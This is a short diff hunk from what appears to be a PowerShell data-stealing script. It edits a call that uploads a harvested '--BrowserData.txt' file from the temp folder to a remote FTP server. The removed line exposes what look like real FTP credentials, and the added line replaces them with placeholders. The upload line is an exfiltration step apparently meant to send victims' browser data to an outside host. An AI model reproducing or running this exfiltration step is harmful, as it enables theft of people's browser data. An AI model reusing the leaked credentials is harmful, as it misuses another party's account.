@@ -126,7 +126,7 @@ function ftp-upload {
     }
 }
 
-ftp-upload -ftpServer $ftpServer -remotePath $remotePath -ftpUsername "zigfl2268087" -ftpPassword "M0tdep@ssezig" -fileupload $env:TMP\--BrowserData.txt
+ftp-upload -ftpServer $ftpServer -remotePath $remotePath -ftpUsername "username" -ftpPassword "pwd" -fileupload $env:TMP\--BrowserData.txt
 
 #################################################################################################
 
